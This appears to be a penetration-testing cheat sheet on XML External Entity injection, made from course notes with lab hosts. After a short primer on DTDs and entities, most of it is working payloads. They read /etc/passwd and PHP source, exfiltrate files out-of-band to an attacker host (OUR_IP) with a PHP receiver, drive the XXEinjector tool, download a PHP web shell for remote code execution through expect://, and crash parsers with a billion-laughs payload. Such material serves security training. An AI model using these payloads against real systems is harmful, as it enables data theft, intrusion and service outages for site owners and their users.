# XML External Entity (XXE) Injection
- [XML DTD](#xml-dtd)
- [XML Entities](#xml-entities)
- [Exploitation](#exploitation)

## XML DTD
- XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.
- Example: 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```
- The following is an example DTD for the XML document :
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
- The DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. 
- After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA).

- The above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd), and then referenced within the XML document with the SYSTEM keyword, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
-------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

## XML Entities
- We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
- Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser. 

> [!TIP]
> We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang="en").



> [!TIP]
> Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm).If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.



## Exploitation
### Local File Disclosure

- **Reading Sensitive Files**
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
``` 

> [!TIP]
> In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

- **Reading Source Code**
    - If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. 
    - Furthermore, we cannot read any binary data, as it would also not conform to the XML format.
    - Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format.
    ```xml
    <!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ]>
    ```

> [!IMPORTANT]
> This trick only works with PHP web applications.

- **Advanced Exfiltration with CDATA**
    - To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). 
    - This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
    - One easy way to tackle this issue would be to define a begin internal entity with `<![CDATA[`, an end internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:
    ```xml
    <!DOCTYPE email [
    <!ENTITY begin "<![CDATA[">
    <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
    <!ENTITY end "]]>">
    <!ENTITY joined "&begin;&file;&end;">
    ]>
    ```
    - After that, if we reference the `&joined; entity`, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.
    - To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a `%` character and can only be used within the DTD.
    - What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:
    ```xml
    <!ENTITY joined "%begin;%file;%end;">
    ```
    ```bash
    echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
    python3 -m http.server 8000

    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    ```
    ```xml
    <!DOCTYPE email [
    <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
    <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
    <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
    %xxe;
    ]>
    ...
    <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
    ```


### Blind XXE
- **Error Based XXE**
    - First, let's try to send malformed XML data, and see if the web application displays any errors.
    - We will host a DTD file that contains the following payload:
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hosts">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
    ```
    - We can call our external DTD script, and then reference the error entity, as follows:
    ```xml
    <!DOCTYPE email [ 
    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %remote;
    %error;
    ]>
    ```

- **Out-of-band Data Exfiltration**
    - We can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it.
    - Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:
    ```xml
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
    ```
    - We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
    ```php
    <?php
    if(isset($_GET['content'])){
        error_log("\n\n" . base64_decode($_GET['content']));
    }
    ?>
    ```
    ```bash
    nano index.php # here we write the above PHP code
    php -S 0.0.0.0:8000

    PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
    ```
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [ 
    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %remote;
    %oob;
    ]>
    <root>&content;</root>
    ```

> [!TIP]
> In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. 

- **Automated OOB Exfiltration**
    ```bash
    git clone https://github.com/enjoiz/XXEinjector.git
    ```
    - Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool:
    ```http
    POST /blind/submitDetails.php HTTP/1.1
    Host: 10.129.201.94
    Content-Length: 169
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
    Content-Type: text/plain;charset=UTF-8
    Accept: */*
    Origin: http://10.129.201.94
    Referer: http://10.129.201.94/blind/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Connection: close

    <?xml version="1.0" encoding="UTF-8"?>
    XXEINJECT
    ```
    - Now, we can run the tool with the `--host/--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
    ```bash
    ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

    ...SNIP...
    [+] Sending request with malicious XML.
    [+] Responding with XML for: /etc/passwd
    [+] Retrieved data:


    cat Logs/10.129.201.94/etc/passwd.log 
    ```

### Remote Code Execution 
- This exploit requires the PHP expect module to be installed and enabled.
- If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output
- However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

> [!NOTE]
> We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

### DOS Attack
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```